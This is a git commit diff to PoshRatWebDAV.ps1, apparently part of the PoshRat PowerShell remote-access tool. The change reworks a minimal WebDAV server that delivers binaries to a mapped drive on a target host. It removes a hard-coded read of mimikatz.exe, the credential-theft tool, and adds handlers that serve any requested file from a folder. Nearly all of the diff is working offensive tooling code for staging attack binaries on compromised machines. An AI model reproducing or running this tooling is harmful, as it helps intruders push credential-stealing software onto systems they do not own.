cda618d58b887dd507751c7816edf430f850ece4
Casey Smith <netsmith@gmail.com>
2015-07-21 13:45:13 -0600

    Update PoshRatWebDAV.ps1

--- PoshRatWebDAV.ps1
+++ PoshRatWebDAV.ps1
@@ -21,35 +21,12 @@ $net.MapNetworkDrive("r:", "\\127.0.0.1\drive", $true, "domain\user", "password"
 
 
 #Begin WEBDAV Just Enough WebDAV to allow you to map drive to get a binary back to host:)
-[byte[]] $File = [System.IO.File]::ReadAllBytes('C:\Tools\mimikatz.exe')
 
-#Just Enough WEBDAV to allow you to map drive to get a binary back to host:)
-[byte[]] $File = [System.IO.File]::ReadAllBytes('C:\Tools\mimikatz.exe')
 
 $webDAVPROPFINDResponse = '<?xml version="1.0" encoding="utf-8"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://'+ $Server +'/</D:href><D:propstat><D:status>HTTP/1.1 200 OK</D:status><D:prop><D:getcontenttype/><D:getlastmodified>Thu, 07 Aug 2014 16:33:21 GMT</D:getlastmodified><D:lockdiscovery/><D:ishidden>0</D:ishidden><D:supportedlock><D:lockentry><D:lockscope><D:exclusive/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry><D:lockentry><D:lockscope><D:shared/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry></D:supportedlock><D:getetag/><D:displayname>/</D:displayname><D:getcontentlanguage/><D:getcontentlength>0</D:getcontentlength><D:iscollection>1</D:iscollection><D:creationdate>2014-05-27T19:01:44.48Z</D:creationdate><D:resourcetype><D:collection/></D:resourcetype></D:prop></D:propstat></D:response></D:multistatus>'
 
-$webDAVXFERResponse = '<?xml version="1.0" encoding="utf-8"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://'+$Server+'/drive/</D:href><D:propstat><D:status>HTTP/1.1 200 OK</D:status><D:prop><D:getcontenttype>application/octet-stream</D:getcontenttype><D:getlastmodified>Thu, 11 Jun 2015 05:20:18 GMT</D:getlastmodified><D:lockdiscovery/><D:ishidden>0</D:ishidden><D:supportedlock><D:lockentry><D:lockscope><D:exclusive/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry><D:lockentry><D:lockscope><D:shared/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry></D:supportedlock><D:getetag>"3d6f834e6a4d01:0"</D:getetag><D:displayname>autoruns.exe</D:displayname><D:getcontentlanguage/><D:getcontentlength>'+ $File.Length +'</D:getcontentlength><D:iscollection>0</D:iscollection><D:creationdate>2014-05-27T19:36:39.240Z</D:creationdate><D:resourcetype/></D:prop></D:propstat></D:response></D:multistatus>'
-
-
 $webDAVPROPPATCHResponse = '<?xml version="1.0"?><a:multistatus xmlns:b="urn:schemas-microsoft-com:office:office" xmlns:a="DAV:"><a:response><a:href>'+ $Server + '/drive/</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><b:Author/></a:prop></a:propstat></a:response></a:multistatus>'
 
-$webDAVLOCKResponse = '<?xml version="1.0" encoding="utf-8" ?>
-<d:prop xmlns:d="DAV:">
-  <d:lockdiscovery>
-    <d:activelock>
-      <d:locktype><d:write/></d:locktype>
-      <d:lockscope><d:exclusive/></d:lockscope>
-      <d:depth>Infinity</d:depth>
-      <d:owner>
-        <d:href>'+$Server+'/drive/file</d:href>
-      </d:owner>
-      <d:timeout>Second-345600</d:timeout>
-      <d:locktoken>
-        <d:href>opaquelocktoken:e71d4fae-5dec-22df-fea5-00a0c93bd5eb1</d:href>
-      </d:locktoken>
-    </d:activelock>
-  </d:lockdiscovery>
-</d:prop>'
 
 #End WEBDAV
 
@@ -143,6 +120,9 @@ while ($true) {
         $message = $webDAVPROPPATCHResponse
     }
 	if (($request.HttpMethod -eq "LOCK") -or ($request.HttpMethod -eq "UNLOCK")) { 
+		$Uri = $request.Url 
+		$RequestedFileName = $Uri.Segments[-1]		
+		$webDAVLOCKResponse = '<?xml version="1.0" encoding="utf-8" ?><d:prop xmlns:d="DAV:">  <d:lockdiscovery> <d:activelock><d:locktype><d:write/></d:locktype><d:lockscope><d:exclusive/></d:lockscope><d:depth>Infinity</d:depth><d:owner>  <d:href>'+$Server+'/drive/'+ $RequestedFileName+'</d:href></d:owner><d:timeout>Second-345600</d:timeout><d:locktoken>  <d:href>opaquelocktoken:e71d4fae-5dec-22df-fea5-00a0c93bd5eb1</d:href></d:locktoken> </d:activelock>  </d:lockdiscovery></d:prop>'
         $message = $webDAVLOCKResponse
     }
 	if ($request.HttpMethod -eq "PUT") {
@@ -166,11 +146,17 @@ while ($true) {
 		$response.Close()
 		continue
 	}
-	if ($request.Url -match '/drive/$' -and ($request.HttpMethod -eq "PROPFIND") ){  
+	if ($request.Url -match '/drive/' -and ($request.HttpMethod -eq "PROPFIND") ){  
+		$Uri = $request.Url 
+		$RequestedFileName = $Uri.Segments[-1]
+		[byte[]] $buffer = [System.IO.File]::ReadAllBytes("$webDAVFolder\$RequestedFileName")
+		$webDAVXFERResponse = '<?xml version="1.0" encoding="utf-8"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://'+$Server+'/drive/</D:href><D:propstat><D:status>HTTP/1.1 200 OK</D:status><D:prop><D:getcontenttype>application/octet-stream</D:getcontenttype><D:getlastmodified>Thu, 11 Jun 2015 05:20:18 GMT</D:getlastmodified><D:lockdiscovery/><D:ishidden>0</D:ishidden><D:supportedlock><D:lockentry><D:lockscope><D:exclusive/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry><D:lockentry><D:lockscope><D:shared/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry></D:supportedlock><D:getetag>"3d6f834e6a4d01:0"</D:getetag><D:displayname>'+$RequestedFileName+'</D:displayname><D:getcontentlanguage/><D:getcontentlength>'+ $buffer.Length +'</D:getcontentlength><D:iscollection>0</D:iscollection><D:creationdate>2014-05-27T19:36:39.240Z</D:creationdate><D:resourcetype/></D:prop></D:propstat></D:response></D:multistatus>'
 		$message = $webDAVXFERResponse
 	}
-	if ($request.Url -match '/drive/file.bin$' -and ($request.HttpMethod -eq "GET") ){ 
-		[byte[]] $buffer = $File
+	if ($request.Url -match '/drive/' -and ($request.HttpMethod -eq "GET") ){ 
+		$Uri = $request.Url 
+		$RequestedFileName = $Uri.Segments[-1]
+		[byte[]] $buffer = [System.IO.File]::ReadAllBytes("$webDAVFolder\$RequestedFileName")
 		$response.ContentType = 'application/octet-stream'
 		$response.ContentLength64 = $buffer.length
 		$output = $response.OutputStream
